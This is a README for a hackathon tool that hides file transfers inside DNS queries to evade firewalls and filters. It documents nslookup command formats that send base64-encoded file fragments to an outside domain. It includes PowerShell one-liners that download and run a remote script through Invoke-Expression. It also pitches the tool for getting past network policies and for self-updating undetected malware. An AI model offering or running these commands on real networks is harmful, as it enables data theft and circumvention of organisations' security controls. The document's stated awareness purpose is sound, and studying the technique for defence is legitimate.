# DNS Exfiltration 

![alt text](https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/DNS-EXFIL.png)

Hi, if you're reading this, you probably were sent here from a text message after inputting a command. If you were not, I recommend running the following command in CMD:
`nslookup text.YOURPHONENUMBER.dns-exfil.tech`

## Awards (Rowdyhacks VII 3/27/2022)
- 2nd Place overall (General Track)
- Best use of Google Cloud
- Best use of Twilio






## Features

- SQL Database
- NodeJs Name Server
- PowerShell client interface
- Twilio for text messages
- ...and of course, our beautiful DNS exfiltration method

Thank you to **Google Cloud, Domain.com & Twilio** for making this possible!

## What is DNS Exfiltration?

DNS Exfiltration in its most simplest terms is a way to exchange any kind of data in a restrictive environment, but what is it that makes it so special? 

To understand the answer to this question, we must first understand what DNS is. DNS stands for Domain Name Server, it is a server that translates "domains" such as "google.com" or "roblox.com" into their respective IP addresses. To learn more about DNS, check out cloudflare's article on it: https://www.cloudflare.com/learning/dns/what-is-dns/

DNS is a **vital** part of the everyday internet, everytime you access the internet you're likely using this protocol in some way. To get an example of how DNS works, open up `cmd` from the windows menu and type `nslookup google.com`. You'll get a pretty straight forward response of a bunch of numbers. This is the normal behavior for DNS.

### The mailman analogy
The best way to describe this program is through an analogy about mailmen:

Mailman A receives a package from a citizen with an address on it, the mailman looks at it and says "This doesn't look familiar" so the mailman asks his buddy, mailman B if they know where the address is. Mailman B doesn't seem to know, so this process repeats a few times until eventually, one of the mailmen says "Hey, I know where that address is and I'm the only one who knows". So the other mailmen give the letter to them, they give it to the person (server) at the address, and they hand the modified letter back to the mailmen with the initial sender as the recipient as per usual. This activity is completely normal, so the other mailmen pay no mind and return it to the initial sender, despite for some reason the data in the mail seems a bit unusual.

So back to the initial question, if DNS's only job is to resolve domain names, how are you able to exchange any kind of data as we claim? 

**The answer**: We disguise encoded data as a normal DNS record response, which can only be properly understood by the client and the server using this program.

## Okay, but why?

DNS exfiltration is a very powerful exploit if used correctly. It tends to be evasive to most firewalls and DNS filters as it creates seemingly normal DNS traffic straight to and from an facilities DNS server, giving admins a false sense of control and security. You may block all other DNS servers, but it doesn't matter if your DNS server has to ask other DNS servers for help as most do. 

This tool could be used to do anything from downloading minecraft when your school network blocks, it to creating malware that procedurally updates itself undetected. This program runs entirely off of systems native to windows, all you need is powershell or cmd and you can transfer files wherever and whenever you want, regardless if a network policies desire you to do otherwise.

## This sounds malicious, why did you make it?

Our goal is not to spread malware or fear monger, if we wished to do that there would be no reason in making this open source. Our goal is to spread awareness about potential exploits that utilize clever and unexpected avenues. Its important we're all cognizant of these risks and do what we can to mitigate them in order to build a safer internet.

This is purely our take on DNS Exfiltration, we've built somewhat of a framework here that essentially turns DNS into a command line interface.

# SMS COMMANDS

`list loaded`

Displays a list of cached files on the server which can be quickly pulled using the client script

# SERVER "API" DOCUMENTATION

***THERE IS A POWERSHELL SCRIPT TO AUTOMATE THIS UNDER THE CLIENT FOLDER*** 

## A Record:

`nslookup text.PHONENUMBER.dns-exfil.tech`

Sends a text to your phone number with information about how to get to this page.

| Name | Description |
| ----------- | ----------- |
| **PHONENUMBER** | Any US phone number, text service is provided by Twilio |

## CNAME Record:

`nslookup -type=CNAME up.start.FILENAME.dns-exfil.tech`

Begins the file upload process, returns a CNAME record which contains the "APIKEY" for future calls

| Name | Description |
| ----------- | ----------- |
| **FILENAME** | Desired name of the file, must be unique or will return with "EXIST" string |

---
 
`nslookup -type=CNAME up.send.APIKEY.SEQUENCE.ENCODEFRAGMENT.dns-exfil.tech`

Used to send encoded data fragments to the server

| Name | Description |
| ----------- | ----------- |
| **APIKEY** |  Key which you received in the up.start response |
| **SEQUENCE** | Number which determines which fragment is being sent. Prevents things from sending twice.|
| **ENCODEFRAGMENT** | base64 encoded data fragment of your file |

---
 
`nslookup -type=CNAME up.end.APIKEY.dns-exfil.tech`

Tells the server you've sent all the required data.

| Name | Description |
| ----------- | ----------- |
| **APIKEY** |  Key which you received in the up.start response |

---
 
`nslookup -type=CNAME dn.info.NAME.dns-exfil.tech`

Fetches info and stages a file to be downloaded from the SQL database. Returns total number of fragment groups required to be sent to the client.

| Name | Description |
| ----------- | ----------- |
| **NAME** | Name of file you wish to fetch |

---
 
`nslookup -type=CNAME dn.get.NAME.SEQUENCE.dns-exfil.tech`

Fetches a group of fragments which are all returned in separate CNAME records, adjustable in CNAME.js

| Name | Description |
| ----------- | ----------- |
| **NAME** | Name of file you wish to fetch |
| **SEQUENCE** | Fragment group index you are currently fetching |

# Client Script Documentation

### Downloading the script

To download and run the client script without creating a temporary file you can use the following command in POWERSHELL ISE:

```powershell
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/Client/UserScript.ps1'))
```

If you would like to download the client script to modify it on your system, you can use the following command:

```powershell
Invoke-WebRequest -uri https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/Client/UserScript.ps1
 -OutFile UserScript.ps1
```

### Exfiltrating a file through DNS

To exfiltrate (upload) a file through DNS, you need to run the user script in POWERSHELL ISE:

```powershell
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/Client/UserScript.ps1'))
#Or run it off of the disk:
.\UserScript.ps1
```

Once you have launched the user script, it prompts you for if you want to upload a file, download a file, or exit the script. Type “1” to select the option for uploading a file.

The script will launch an file explorer window to select a file to upload. Simply select a file and click open to allow the file to upload. 

You will know that the script is successful if it provides you the message “Successfully uploaded” followed by the application name used by the DNS server.

If an error occurs, try to upload the file again as this implementation is transmitting over UDP (which is DNS’ standard transfer protocol) as opposed to a connection-oriented protocol like TCP.

### Infiltrating a file through DNS

To infiltrate (download) a file through DNS, you need to run the user script in POWERSHELL ISE:

```powershell
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Stratiz/DNS-Exfil/main/Client/UserScript.ps1'))
#Or run it off of the disk:
.\UserScript.ps1
```

Once you have launched the user script, it prompts you for if you want to upload a file, download a file, or exit the script. Type “2” to select the option for downloading a file.

The script will prompt you for an application name (a list can collected by texting the Twilio number that is setup in the server with the body of the message being “list loaded”).

After the script is done downloading the file, it will prompt you to save it through a file explorer window. You will know that the script is successful if it provides you the message “Successfully downloaded” followed by the path of the file that was specified from the file explorer window.

If an error occurs, try to download the file again as this implementation is transmitting over UDP (which is DNS’ standard transfer protocol) as opposed to a connection-oriented protocol like TCP.
